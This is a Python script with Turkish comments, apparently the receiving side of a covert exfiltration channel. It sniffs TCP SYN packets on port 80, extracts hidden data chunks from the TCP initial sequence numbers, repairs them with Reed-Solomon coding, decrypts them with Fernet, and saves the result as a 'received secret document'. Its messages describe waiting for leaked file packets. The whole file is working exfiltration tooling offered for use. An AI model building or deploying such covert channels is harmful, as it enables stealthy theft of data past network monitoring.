#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Stego-Alici: TCP ISN Kanalından Veri Çıkarma ve Deşifre Etme

from scapy.all import sniff, TCP
from cryptography.fernet import Fernet
from reedsolo import RSCodec

# --- KONFİGÜRASYON ---
AES_KEY = b'BURAYA_GONDERICININ_Urettigi_ANAHTAR_GELECEK=' 
cipher = Fernet(AES_KEY)
rs = RSCodec(4)

alinan_parcalar = {}

def paket_yakala_ve_ayikla(paket):
    """Ağdan geçen SYN paketlerinin ISN değerlerini okur"""
    if paket.haslayer(TCP) and paket[TCP].flags == "S":
        isn_degeri = paket[TCP].seq
        
        sira_no = (isn_degeri >> 24) & 0xFF
        veri_parcasi = (isn_degeri & 0xFFFFFF).to_bytes(3, 'big')
        
        alinan_parcalar[sira_no] = veri_parcasi
        print(f"[*] Sıra {sira_no} yakalandı.")

if __name__ == "__main__":
    print("[*] Ağ trafiği dinleniyor (Filtre: TCP port 80)...")
    print("Hedefe kilitlenildi. Sızdırılan dosya paketleri bekleniyor... (Çıkmak için Ctrl+C)")
    
    try:
        sniff(filter="tcp port 80", prn=paket_yakala_ve_ayikla, timeout=30)
    except KeyboardInterrupt:
        pass

    print("\n[+] Dinleme tamamlandı! Dosya bütünlüğü test ediliyor...")
    
    ham_bit_katari = b"".join([alinan_parcalar[i] for i in sorted(alinan_parcalar.keys())])
    
    try:
        onarilmis_veri = rs.decode(ham_bit_katari)[0]
        print("[+] Reed-Solomon: Ağ gürültüsü havada onarıldı!")
        
        print("[*] AES-128 şifresi çözülüyor...")
        orijinal_metin = cipher.decrypt(onarilmis_veri)
        
        with open("alinan_gizli_belge.txt", "wb") as f:
            f.write(orijinal_metin)
            
        print("[+] BAŞARILI! Dosya 'alinan_gizli_belge.txt' adıyla kaydedildi.")
    except Exception as e:
        print(f"[-] Hata oluştu (Veri çok bozuk olabilir): {e}")